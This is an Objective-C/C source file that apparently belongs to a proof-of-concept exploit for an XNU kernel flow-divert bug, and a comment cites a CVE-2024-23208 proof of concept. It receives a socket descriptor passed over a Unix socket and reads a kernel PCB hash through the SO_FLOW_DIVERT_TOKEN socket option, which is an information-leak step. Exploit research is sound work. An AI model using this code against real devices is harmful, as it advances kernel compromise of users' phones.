//
//  bruh.c
//  keyboardy
//
//  Created by LL on 3/2/24.
//

#include "bruh.h"
#include <stdio.h>
//#include <c++/v1/thread>
#include <netinet/in.h>
#include <net/if.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <pthread/qos.h>
#include <sys/socket.h>
#include <pthread/pthread.h>
#include <sys/errno.h>
#include "kern_control.h"
#include <sys/sys_domain.h>
#include <sys/fcntl.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/un.h>
#include <errno.h>
@import Foundation;
extern int *__error();
#define error (*__error())

#define IPPROTO_TCP 6
#define FLOW_DIVERT_TLV_CTL_UNIT 10
#define FLOW_DIVERT_TLV_AGGREGATE_UNIT 26
#define SO_FLOW_DIVERT_TOKEN 0x1106
#define FLOW_DIVERT_TLV_SIGNING_ID 25

struct control {
  char     Type;
  uint32_t Length;
  uint32_t Unit;
}__attribute__((packed));

struct aggregate {
  char     Type;
  uint32_t Length;
  uint32_t Unit;
}__attribute__((packed));

struct signing_id {
    uint8_t  Type;
    uint32_t Length;
    uint32_t ID;
}__attribute__((packed));

struct flow_divert_create_packet {
  struct control control_unit;
  struct aggregate aggregate_unit;
  struct signing_id signing;
}__attribute__((packed));

int receive_fd(int socket) {
//    int received_fd = -1;
//    struct msghdr message = {0};
//    struct iovec iov[1];
//    char control_buffer[CMSG_SPACE(sizeof(int))];
//    message.msg_control = control_buffer;
//    message.msg_controllen = sizeof(control_buffer);
//    ssize_t result = recvmsg(socket, &message, 0);
//    if (result == -1) {
//        NSLog(@"RECVMSG FAILED LMAOOOOOOOOOOO");
//        NSLog(@"%d, %s", errno, strerror(errno));
////        receive_fd(socket);
//        perror("recvmsg");
//    } else {
//        struct cmsghdr *cmsg = CMSG_FIRSTHDR(&message);
//        received_fd = *((int *)CMSG_DATA(cmsg));
//        NSLog(@"received fd %d", received_fd);
//    }
//    return received_fd;
    // stolen from https://github.com/fmyyss/XNU_KERNEL_RESEARCH/blob/main/CVE-2024-23208/iOSPOC/main_App/test/main.m#L22 ily so much!
        struct iovec iov[1];
            char dummy;
            char cmsg_buf[CMSG_SPACE(sizeof(int))];

            struct msghdr msg;
            memset(&msg, 0, sizeof(struct msghdr));

            // 设置接收缓冲区
            iov[0].iov_base = &dummy;
            iov[0].iov_len = 1;
            msg.msg_iov = iov;
            msg.msg_iovlen = 1;

            // 设置辅助数据
            msg.msg_control = cmsg_buf;
            msg.msg_controllen = sizeof(cmsg_buf);

            // 接收消息
            if (recvmsg(socket, &msg, 0) == -1) {
                perror("recvmsg");
                exit(EXIT_FAILURE);
            }

            struct cmsghdr *cmsg;
            int fd = -1;

            // 遍历辅助数据寻找文件描述符
            for (cmsg = CMSG_FIRSTHDR(&msg); cmsg != NULL; cmsg = CMSG_NXTHDR(&msg, cmsg)) {
                if (cmsg->cmsg_level == SOL_SOCKET && cmsg->cmsg_type == SCM_RIGHTS) {
                    fd = *(int *)CMSG_DATA(cmsg);
                    break;
                }
            }
        return fd;
//    }
}
uint32_t pcb_hash;
char *pause_mem = NULL;

void bruh() {
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSURL *groupContainerURL = [fileManager containerURLForSecurityApplicationGroupIdentifier:@"group.pisshill"];
    NSString *socketURL = [groupContainerURL.path stringByAppendingPathComponent:@"socket2.text"];
    
    NSLog(@"LMAOOOOOOOOO KEYBOARD KEYBOARD AMONG US");

    int sockfd;
    struct sockaddr_un serv_addr;
    sockfd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (sockfd < 0) {
        NSLog(@"Error opening socket");
        perror("ERROR opening socket");
        exit(EXIT_FAILURE);
    }

    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sun_family = AF_UNIX;
    strncpy(serv_addr.sun_path, socketURL.UTF8String, sizeof(serv_addr.sun_path) - 1);
    NSLog(@"path is %s", serv_addr.sun_path);

    if (connect(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
        NSLog(@"Error connecting to socket: %d, %s", errno, strerror(errno));
        perror("ERROR connecting");
//        exit(EXIT_FAILURE);
    } else {
        NSLog(@"Connected to socket properly");
    }
    // Receive the socket file descriptor from the parent process
    NSLog(@"Receiving fd");
    int sock_fd = receive_fd(sockfd);
//    NSLog(@"Received");
    NSLog(@"Child PID:%d\n",getpid());
//    sleep(1);
//  do stuff with the initial socket
    char to_BUF[0x40] = {0};
    socklen_t Length = 0x40;
    listen(sock_fd,5); // update so->lastpid
    getsockopt(sock_fd, SOL_SOCKET, SO_FLOW_DIVERT_TOKEN, to_BUF, &Length);
    pcb_hash = *(uint32_t*)(to_BUF + 14);
    NSLog(@"PCB_HASH_VAL:\t\t%#x\n",pcb_hash);
}

